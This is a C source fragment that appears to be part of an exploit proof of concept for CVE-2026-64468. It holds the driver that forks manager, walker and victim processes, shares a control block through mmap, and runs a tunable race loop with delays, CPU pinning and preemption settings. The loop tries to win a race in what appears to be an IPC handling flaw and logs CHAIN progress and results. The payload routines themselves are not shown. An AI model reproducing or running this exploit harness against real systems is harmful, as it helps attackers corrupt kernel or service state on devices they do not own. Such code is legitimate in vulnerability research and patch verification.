/* ------------------------------------------------------------------ */

static pid_t spawn(void (*entry)(int, int), int *status_out, int *control_out)
{
	int status_pipe[2];
	int control_pipe[2];
	pid_t child;

	if (pipe(status_pipe) < 0)
		return -1;
	if (pipe(control_pipe) < 0) {
		(void)close(status_pipe[0]);
		(void)close(status_pipe[1]);
		return -1;
	}
	child = fork();
	if (child < 0) {
		(void)close(status_pipe[0]);
		(void)close(status_pipe[1]);
		(void)close(control_pipe[0]);
		(void)close(control_pipe[1]);
		return -1;
	}
	if (child == 0) {
		(void)close(status_pipe[0]);
		(void)close(control_pipe[1]);
		entry(status_pipe[1], control_pipe[0]);
		_exit(0);
	}
	(void)close(status_pipe[1]);
	(void)close(control_pipe[0]);
	*status_out = status_pipe[0];
	*control_out = control_pipe[1];
	return child;
}

static int wait_for_count(volatile unsigned int *counter, unsigned int target,
			  unsigned int timeout_ms)
{
	uint64_t deadline = monotonic_ns() + (uint64_t)timeout_ms * 1000000ULL;

	while (__atomic_load_n(counter, __ATOMIC_ACQUIRE) < target) {
		if (monotonic_ns() > deadline)
			return -1;
		/* Sleep rather than yield: the emulated CPUs are oversubscribed. */
		(void)usleep(200);
	}
	return 0;
}

int main(int argc, char **argv)
{
	unsigned int duration = argc > 1 ? (unsigned int)atoi(argv[1]) : 30U;
	int manager_status = -1, manager_control = -1;
	int walker_status = -1, walker_control = -1;
	int victim_status = -1, victim_control = -1;
	unsigned int attempts = 0;
	unsigned int aborted = 0;
	double last_report = 0.0;
	double start;
	char status = '?';
	long cpus;

	if (argc > 2)
		cfg_threads = (unsigned int)atoi(argv[2]);
	if (argc > 3)
		cfg_stagger_us = (unsigned int)atoi(argv[3]);
	if (argc > 4)
		cfg_p_delay_us = (unsigned int)atoi(argv[4]);
	if (argc > 5)
		cfg_worker_cpu = (unsigned int)atoi(argv[5]);
	if (argc > 6)
		cfg_irq_us = (unsigned int)atoi(argv[6]);
	if (argc > 7)
		cfg_b_cpu_base = (unsigned int)atoi(argv[7]);
	if (argc > 8)
		cfg_b_delay_max_us = (unsigned int)atoi(argv[8]);
	if (argc > 9)
		cfg_b_delay_step_us = (unsigned int)atoi(argv[9]);
	if (argc > 10)
		cfg_preempt_period_us = (unsigned int)atoi(argv[10]);
	if (argc > 11)
		cfg_preempt_hold_us = (unsigned int)atoi(argv[11]);
	if (!cfg_b_delay_step_us)
		cfg_b_delay_step_us = 25U;
	if (cfg_preempt_hold_us && !cfg_preempt_period_us)
		cfg_preempt_period_us = 200U;
	if (!cfg_threads || cfg_threads > MAX_THREADS)
		cfg_threads = 32U;

	cpus = sysconf(_SC_NPROCESSORS_ONLN);
	cfg_cpus = cpus > 0 ? (unsigned int)cpus : 1U;
	if (cfg_worker_cpu >= cfg_cpus)
		cfg_worker_cpu = 0U;
	if (cfg_b_cpu_base >= cfg_cpus)
		cfg_b_cpu_base = cfg_cpus > 1U ? 1U : 0U;

	ctl = mmap(NULL, sizeof(*ctl), PROT_READ | PROT_WRITE,
		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (ctl == MAP_FAILED) {
		perror("mmap control");
		return 1;
	}
	memset((void *)ctl, 0, sizeof(*ctl));

	printf("CVE-2026-64468 CHAIN-START duration=%us threads=%u stagger_us=%u p_delay_us=%u worker_cpu=%u irq_us=%u b_cpu_base=%u cpus=%u b_delay_max_us=%u b_delay_step_us=%u preempt_period_us=%u preempt_hold_us=%u\n",
	       duration, cfg_threads, cfg_stagger_us, cfg_p_delay_us,
	       cfg_worker_cpu, cfg_irq_us, cfg_b_cpu_base, cfg_cpus,
	       cfg_b_delay_max_us, cfg_b_delay_step_us, cfg_preempt_period_us,
	       cfg_preempt_hold_us);
	fflush(stdout);

	if (spawn(manager_process, &manager_status, &manager_control) < 0 ||
	    read_status(manager_status, &status) < 0 || status != 'R') {
		printf("CVE-2026-64468 CHAIN-ABORT stage=manager status=%c\n",
		       status);
		return 1;
	}
	if (spawn(walker_process, &walker_status, &walker_control) < 0 ||
	    read_status(walker_status, &status) < 0 || status != 'R') {
		printf("CVE-2026-64468 CHAIN-ABORT stage=walker status=%c\n",
		       status);
		return 1;
	}
	if (spawn(victim_process, &victim_status, &victim_control) < 0 ||
	    read_status(victim_status, &status) < 0 || status != 'R') {
		printf("CVE-2026-64468 CHAIN-ABORT stage=victim status=%c\n",
		       status);
		return 1;
	}

	start = monotonic_seconds();
	last_report = start;
	while (monotonic_seconds() - start < (double)duration) {
		__atomic_store_n(&ctl->go, 0U, __ATOMIC_RELEASE);
		if (cfg_b_delay_max_us)
			__atomic_store_n(&ctl->b_delay_us,
					 (attempts * cfg_b_delay_step_us) %
						 (cfg_b_delay_max_us +
						  cfg_b_delay_step_us),
					 __ATOMIC_RELEASE);
		__atomic_store_n(&ctl->b_armed, 0U, __ATOMIC_RELEASE);
		__atomic_store_n(&ctl->p_armed, 0U, __ATOMIC_RELEASE);
		__atomic_store_n(&ctl->b_done, 0U, __ATOMIC_RELEASE);
		__atomic_store_n(&ctl->p_done, 0U, __ATOMIC_RELEASE);

		/*
		 * The victim has to be parked in its per-thread reads before
		 * the walker starts sending, otherwise its looper-flagged main
		 * thread can dequeue an e2 that belongs to a worker.
		 */
		send_status(victim_control, 'a');
		send_status(manager_control, 'a');
		if (read_status(manager_status, &status) < 0 || status != 's' ||
		    read_status(victim_status, &status) < 0 || status != 's') {
			aborted++;
			break;
		}
		send_status(walker_control, 'a');
		if (read_status(walker_status, &status) < 0 || status != 's') {
			aborted++;
			break;
		}
		if (wait_for_count(&ctl->b_armed, cfg_threads, 15000U) < 0 ||
		    wait_for_count(&ctl->p_armed, cfg_threads, 15000U) < 0)
			aborted++;
		__atomic_store_n(&ctl->go, 1U, __ATOMIC_RELEASE);

		if (wait_for_count(&ctl->b_done, cfg_threads, 20000U) < 0 ||
		    wait_for_count(&ctl->p_done, 1U, 20000U) < 0) {
			aborted++;
			break;
		}
		if (read_status(walker_status, &status) < 0 || status != 'd' ||
		    read_status(victim_status, &status) < 0 || status != 'd') {
			aborted++;
			break;
		}
		attempts++;
		/* Report on a wall-clock cadence: readable logs and demos. */
		if (monotonic_seconds() - last_report >= 5.0) {
			last_report = monotonic_seconds();
			printf("CVE-2026-64468 CHAIN-PROGRESS attempts=%u walks=%u setup_failures=%u elapsed=%.1f\n",
			       attempts,
			       __atomic_load_n(&ctl->walked, __ATOMIC_RELAXED),
			       __atomic_load_n(&ctl->setup_failures,
					       __ATOMIC_RELAXED),
			       monotonic_seconds() - start);
			fflush(stdout);
		}
	}

	send_status(walker_control, 'q');
	send_status(victim_control, 'q');
	send_status(manager_control, 'q');
	__atomic_store_n(&ctl->quit, 1U, __ATOMIC_RELEASE);
	(void)usleep(200000);

	printf("CVE-2026-64468 CHAIN-RESULT attempts=%u walks=%u setup_failures=%u aborted=%u elapsed=%.1f\n",
	       attempts, __atomic_load_n(&ctl->walked, __ATOMIC_RELAXED),
	       __atomic_load_n(&ctl->setup_failures, __ATOMIC_RELAXED), aborted,
	       monotonic_seconds() - start);
	fflush(stdout);
	while (waitpid(-1, NULL, WNOHANG) > 0)
		;
	return 0;
}
